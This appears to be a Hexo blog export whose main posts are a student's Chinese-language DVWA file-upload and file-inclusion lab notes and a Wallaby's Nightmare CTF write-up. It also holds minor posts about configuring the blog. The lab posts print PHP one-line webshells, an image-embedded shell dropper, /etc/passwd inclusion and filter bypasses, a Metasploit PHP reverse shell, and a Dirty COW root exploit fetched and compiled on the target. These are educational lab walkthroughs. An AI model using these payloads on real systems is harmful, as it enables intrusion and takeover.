    <url>/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 那么我们今天来讲包含<br>老师给了关于<strong>文件上传和文件包含</strong>的笔记 那我就誊在这里 再把实践部分传过来<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<span id="more"></span>

<h1 id="笔记部分"><a href="#笔记部分" class="headerlink" title="笔记部分"></a>笔记部分</h1><p>文件上传漏洞</p>
<h2 id="1-什么是文件上传漏洞"><a href="#1-什么是文件上传漏洞" class="headerlink" title="1.什么是文件上传漏洞"></a>1.什么是文件上传漏洞</h2><p>漏洞描述<br>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p>
<h2 id="2-什么是webshell"><a href="#2-什么是webshell" class="headerlink" title="2.什么是webshell"></a>2.什么是webshell</h2><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于 windows 系统给的 cmd.exe 或者 Linux 下 bash 等，虽然这些系统的命令解释器不止一种。<br>WebShell 是一个网站的后门，也是一个命令解释器，不过是以 Web 方式（HTTP 协议）通信（传递命令消息），继承了 Web 用户的权限。WebShell 本质上是服务器端可运行的脚本文件，后缀名为.php/.asp/.aspx/.jsp 等，也就是说 WebShell 接受来自于 Web 用户的命令，然后在服务器端执行。</p>
<h2 id="3-一句话木马-小马"><a href="#3-一句话木马-小马" class="headerlink" title="3.一句话木马(小马)"></a>3.一句话木马(小马)</h2><pre class="line-numbers language-none"><code class="language-none">asp:
&lt;%e1val request("pass")%&gt;
php:
&lt;?php  @e1val($_GET['cmd']);?&gt;
&lt;?php @s1ystem($_GET['cmd']);?&gt;
&lt;?php $cmd=$_GET['cmd']; s1ystem($cmd); ?&gt;
&lt;?php @e1val($_POST['cmd']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>请记住以上4条语句！！！（其中数字1去掉）</p>
<h2 id="4-（低级别）文件上传漏洞"><a href="#4-（低级别）文件上传漏洞" class="headerlink" title="4.（低级别）文件上传漏洞"></a>4.（低级别）文件上传漏洞</h2><p>切换到UPload<br>1）先上传一张图片（文件大小在100KB以内），根据返回路径验证该文件受否存在。</p>
<p>2）再上传一个小马ma1.php，<br><!--?php  @e1val($_GET['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>3）再上传一个小马ma2.php，<br><!--?php  @s1ystem($_GET['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>4）再上传一个小马ma3.php，<br><!--?php @e1val($_POST['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>5)使用中国菜刀（或蚁剑antword）链接ma3.php，测试文件上传、下载。（文件管理）</p>
<p>6）使用菜刀的虚拟终端功能，远程执行目标计算机系统指令。（虚拟终端）</p>
<p>7）使用菜刀的数据库管理功能，远程执行目标计算机系统指令。（数据库管理）</p>
<p><t>数据库类型</t><br><h>主机地址<h><br><u>数据库用户</u></h></h></p>
<p>数据库密码</p> 

<p>以上内容根据实际情况填写，本实验为：<br><t>MYSQL</t><br><h>192.168.88.128<h><br><u>root</u></h></h></p>
<p>owaspbwa</p> 

<h2 id="5-（中级别）文件上传漏洞"><a href="#5-（中级别）文件上传漏洞" class="headerlink" title="5.（中级别）文件上传漏洞"></a>5.（中级别）文件上传漏洞</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_type == “image/jpeg”) &amp;&amp;  ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的MIME类型做了限制。</p>
<p>什么是MIME<br>MIME, 全称为“Multipurpose Internet Mail Extensions”, 比较确切的中文名称为“多用途互联网邮件扩展”。它是当前广泛应用的一种电子邮件技术规范，基本内容定义于RFC 2045-2049<br>什么是MIME类型?-在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。<br>例 如，架设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application/vnd.ms-excel”。 在大多数实际情况中，这个文件然后将传送给 Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类 型的方法是通过Response对象的 ContentType属性。<br>多媒体文件格式MIME<br>最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。<br>MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。<br>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p>
<p>常见的MIME类型</p>
<p>超文本标记语言文本 .html,.html text/html<br>普通文本 .txt text/plain<br>RTF文本 .rtf application/rtf<br>GIF图形 .gif image/gif<br>JPEG图形 .ipeg,.jpg image/jpeg<br>au声音文件 .au audio/basic<br>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>MPEG文件 .mpg,.mpeg video/mpeg<br>AVI文件 .avi video/x-msvideo<br>GZIP文件 .gz application/x-gzip<br>TAR文件 .tar application/x-tar</p>
<p>如何修改上传文件的MIME类型，请出Web神器BurpSuite<br>BurpSuite可以将客户端与服务器之间传输的数据进行拦截，然后对数据进行修改并再次发送，从而完成攻击过程。<br>1)本实验我们BurpSuite代理服务器和客户端是同一台计算机（KALI），因此，BurpSuite代理模块监听127.0.0.1:8080(无需修改)；<br>2）设置客户端浏览器firefox的代理地址，指向BurpSuite代理服务器（127.0.0.1:8080）；<br>3）再次上传ma.php，发现网页一直等在那里（因为数据发送到了BurpSuite代理服务器，等待用户操作）；<br>4）在BurpSuite中拦截界面找到上传文件的数据包，修改上传文件的MIME类型<br>（修改content-type，由appalication/x-php改为imag/jpeg）<br>5)上传成功，后续操作略。</p>
<h2 id="6-（高级别）文件上传漏洞利用"><a href="#6-（高级别）文件上传漏洞利用" class="headerlink" title="6.（高级别）文件上传漏洞利用"></a>6.（高级别）文件上传漏洞利用</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_ext == “jpg” || $uploaded_ext == “JPG” || $uploaded_ext == “jpeg” || $uploaded_ext == “JPEG”) &amp;&amp; ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的扩展名做了限制。<br>未完待续……<br>6.DVWA靶场文件包含漏洞利用（低级别）<br>To include a file edit the ?page=index.php in the URL to determine which file is included.<br>code:<br><code>&lt;?php     $file = $_GET['page']; //The page we wish to display   ?&gt; </code><br>文件包含漏洞<br>文件包含分为本地文件包含和远程文件包含</p>
<p>1）先看本地文件包含（包含的文件是目标计算机上的文件）<br>e.g:<br>?page=/etc/passwd<br>?page=/etc/resolv.conf<br>….<br>也可以包含一些我们自己创建的文件<br>我们登录到DVWA靶场，切换到/var/www/目录，创建2个文件：1.txt和2.php<br>cd /var/www/<br>echo 123 &gt; 1.txt<br>echo “<!--?php phpinfo(); ?-->“ &gt; 2.php<br>在kali上去包含我们自己创建的这2个文件，看看效果，有什么启发？</p>
<p>2）再看远程文件包含（包含的文件是远程计算机上的文件）<br>在kali上假设一个网站，网站主目录放点内容（也可以是3.txt和4.php）<br>systemctl status apache2<br>systemctl start apache2<br>cd /var/www/html<br>echo 123 &gt; 3.txt<br>echo “<!--?php phpinfo(); ?-->“ &gt; 4.php<br>进入DVWA文件包含页面，试着包含一下，看看效果<br><code>?page=http://kali的IP地址/3.txt</code><br><code>?page=http://kali的IP地址/4.php</code><br>sudo passwd root //修改root用户的密码</p>
<p>3)图片种马（将一句话木马写到图片中）<br>如何种马？准备一个正经的图片1.jpg和1个不正经的1.php,通过强大的copy命令合成一下：<br>copy 1.jpg/b+1.php/a hack.jpg<br>合成后验证这个图片能够正常显示，并查看图片中是否有这个一句话木马。<br>1.php内容如下：<br><code>&lt;?fputs(fopen("shell10.php","w"),'&lt;?php @system($_GET['cmd']);?&gt;')?&gt;</code></p>
<h2 id="7-（中级别）文件包含漏洞利用"><a href="#7-（中级别）文件包含漏洞利用" class="headerlink" title="7.（中级别）文件包含漏洞利用"></a>7.（中级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>发现也存在本地文件包含漏洞<br>在测试一下是否存在远程文件包含漏洞<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/2.php</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>发现远程文件包含漏洞不成功；<br>查看网站后端源码，发现以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
    $file = $_GET['page']; // The page we wish to display 
    
    // Bad input validation
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file); 
 ?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试通过以下方式绕过：<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=hhttp://ttp://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=HTTP://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=Http://192.168.88.129/1.txt</code></p>
<h2 id="8-（高级别）文件包含漏洞利用"><a href="#8-（高级别）文件包含漏洞利用" class="headerlink" title="8.（高级别）文件包含漏洞利用"></a>8.（高级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>出现报错：<br>ERROR: File not found!<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>出现报错：<br>ERROR: File not found!<br>发现本地和远程文件包含漏洞都不成功；<br>查看网站后端源码，发现以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none"> &lt;?php
$file = $_GET['page']; //The page we wish to display 

// Only allow include.php
if ( $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种代码的写法相当安全但是不够灵活！！！</p>
<h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1-漏洞发现"><a href="#1-漏洞发现" class="headerlink" title="1.漏洞发现"></a>1.漏洞发现</h2><p>总之先进入dvwa靶机 将难度调整至<strong>medium</strong> 选择<strong>file inclusion</strong><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"><br>先通过<a href="http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd%E6%B5%8B%E8%AF%95">http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd测试</a><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2.jpg" alt="2"><br>确实存在本地文件包含漏洞<br>随后我们再来测试一下远程包含漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">systemctl status apache2 //查看系统apache2服务的情况
systemctl start apache2 //开启apache2服务
cd /var/www/html //进入apache2服务端源目录
echo 123 &gt; 3.txt //创建内容为123的3.txt文件
echo "&lt;?php phpinfo(); ?&gt;" &gt; 4.php //创建运行phpinfo的4.php网站<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/3.jpg" alt="3"><br>在page后加入<code>http://kali的ip/4.php</code><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/4.jpg" alt="4"></p>
<p>发现没有成功</p>
<p>查看源码 寻找原因<br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/5.jpg" alt="5"><br>发现网站中会将<code>http://</code>与<code>https://</code>替换为空格</p>
<p>这里有两种方法 <strong>大写</strong> 或 <strong>双写</strong></p>
<p><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/6.jpg" alt="6"><br>大写后发现成功绕过防护</p>
<blockquote>
<h3 id="好的-目前先讲到这里-我们日后再说"><a href="#好的-目前先讲到这里-我们日后再说" class="headerlink" title="好的 目前先讲到这里 我们日后再说"></a>好的 目前先讲到这里 我们日后再说</h3></blockquote>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>关于加入aplayer的方式</title>
    <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p>
<p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
  <entry>
    <title>关于在next7.8.0中建设评论功能这件事</title>
    <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果  最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><b>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</b></p>
<span id="more"></span>


<h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p>
<blockquote>
<p>Valine 特性</p>
</blockquote>
<ul>
<li>快速</li>
<li>安全</li>
<li>Emoji 😉</li>
<li>无后端实现</li>
<li>MarkDown 全语法支持</li>
<li>轻量易用(~15kb gzipped)</li>
<li>文章阅读量统计 v1.2.0+</li>
</ul>
<blockquote>
<p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL&nbsp;<strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p>
</blockquote>
<p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a>  <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a>  <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p>
<p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p>
<p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p>
<p>害…过几天再试吧 都是泪啊</p>
<h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote>
<p>Gitalk 特性</p>
</blockquote>
<ul>
<li>使用 GitHub 登录</li>
<li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li>
<li>支持个人或组织</li>
<li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li>
<li>快捷键提交评论 （cmd|ctrl + enter）</li>
</ul>
<p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p>
<p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p>
<p>但目前没有具体的解决方式</p>
<h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>再来一次</title>
    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之WALLABY&#39;S-NIGHTMARE</title>
    <url>/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>最近加入了学校的网安工作室 每周会给点作业 小项目需要写writeup<br>总之这是今天的靶机 </p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>老样子 VMWARE 靶机 kali<br>ps: <strong>请注意每个人的ip都会因为配置有细微的区别 请勿照抄代码</strong><br>攻击机：kali（192.168.246.128）<br>靶机：WALLABY’S: NIGHTMARE (V1.0.2)（192.168.246.134）<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a></p>
<span id="more"></span>

<h2 id="发现靶机-访问网站"><a href="#发现靶机-访问网站" class="headerlink" title="发现靶机&amp;访问网站"></a>发现靶机&amp;访问网站</h2><p>总之先<code>arp-scan -l</code>一下<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/1.jpg" alt="1"><br>发现靶机ip为192.168.246.134 使用nmap查看开放端口<br><code> nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/2.jpg" alt="2"><br>结果显示开放了22 80端口<br>先上firefox查看 80端口对应的http服务<br><code>http://192.168.246.134</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/3.jpg" alt="3"><br>↑叫我输入个用户名 我这里就用我常用的网名了<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/4.jpg" alt="4"><br>↑点击超链接开始你的ctf之旅</p>
<h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>网站里有一只大眼睛 上面的英语大意是<strong>它发现了你要渗透这个服务器 正在观察你</strong><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/5.jpg" alt="5"><br>我们先通过f12查看源码 发现没有什么隐藏的东西<br>于是使用web漏洞扫描工具<strong>nikto</strong>进行扫描<br><code>nikto -host 192.168.246.134</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/6.jpg" alt="6"><br><strong>nikto</strong>表示这个网站存在漏洞 于是我们随它指示将这段链接复制到firefox替换网址后半段<br>输完之后 enter访问 发现 <strong>欸 怎么连接不上了</strong><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/7.jpg" alt="7"><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/8.jpg" alt="8"><br>↑就算是通过history看之前大眼睛的网站也链接不上<br>再次通过nmap扫描 看看是不是80端口的问题<br><code> nmap -p- 192.168.246.134 //快速扫描常用端口</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/9.jpg" alt="9"><br>我们可以看到多出了个60080端口<br>让我们通过firefox访问该端口查看一下什么情况<br><code>http://192.168.246.134:60080/</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/10.jpg" alt="10"><br>英语大意是<strong>惊讶你追的很紧 幸好它完全转移到了一个不同的端口</strong><br>这里我们可以猜到<br>之前在80端口时有个/?page页面 这里也多半会有 让我们试试看<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/11.jpg" alt="11"><br>果然对劲 我们再使用<strong>dirb</strong>工具对此页面进行目录扫描<br><code>dirb http://192.168.246.134:60080/?page=</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/12.jpg" alt="12"><br>结果里出现了一个后缀为mailer的网页<br>访问看看<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/13.jpg" alt="13"><br>看似什么都没有<br>但我们可以使用f12查看源码 发现有一段注释<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/14.jpg" alt="14"><br>这里<br><code>&lt;a href='/?page=mailer&amp;mail=mail wallaby "message goes here"'&gt;&lt;button type='button'&gt;Sendmail&lt;/button&gt;</code><br>暴露了存在RCE（远程代码执行漏洞）</p>
<blockquote>
<p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。——以上来自百度百科</p>
</blockquote>
<p>于是我们验证一下<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/15.jpg" alt="15"><br>↑通过改变命令验证<br>漏洞已经出现<br>于是乎我们便可以通过多种方式来解决了<br>我用的是Metasploit</p>
<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">msfconsole
use exploit/multi/script/web_delivery
set target 1
set payload php/meterpreter/reverse_tcp
set lhost 192.168.246.128
set lport 8888
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先输入<strong>msfconsole</strong>进入msf控制台<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/16.jpg" alt="16"><br>↑设置msf参数，开启监听<br>将它所反馈出的命令<strong>复制在整个网址的mail=之后</strong>来启动整个监听程序<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/17.jpg" alt="17"><br>网站一直显示加载中则多半成功了 我们ctrl+c停止后输入sessions查看<br>出现了一个已获取的shell<br>我们输入<code>sessions 1</code>来链接shell<br>随后使用<code>sysinfo</code>命令查看靶机的系统信息<br>使用<code>shell -t</code>命令来获取系统shell<br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/18.jpg" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>总算来到了惊心动魄的提权环节<br>我们再开一个cmd窗口<br>输入<br>wget+<code>https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</code><br>(格式所迫 只能这么写了)<br><code>python3 -m http.server 8081 //开启kali的http服务</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/19.jpg" alt="19"><br>回到刚才连接到靶机的cmd窗口<br><code>wget http://192.168.246.128:8081/cowroot.c //用靶机获取kali所分享的文件</code><br><code>gcc cowroot.c -o exp -pthread  //对刚刚下载的提权脚本进行编译</code><br><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/20.jpg" alt="20"></p>
<pre class="line-numbers language-none"><code class="language-none">chmod +x exp //给提权脚本赋予执行权限 
./exp //运行提权脚本，运行后即可提权至root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这两句代码后 你就已经拥有了所有的权限<br>运用一些基础的linux语言便可获得flag</p>
<pre class="line-numbers language-none"><code class="language-none">cd /root //将目录切换至root
ls //列出文件夹中的文件
cat flag.txt //查看flag.txt中的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/21.jpg" alt="21"></p>
<h1 id="好的那么我们下次见！"><a href="#好的那么我们下次见！" class="headerlink" title="好的那么我们下次见！"></a><strong>好的那么我们下次见！</strong></h1></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>目前的进展</title>
    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
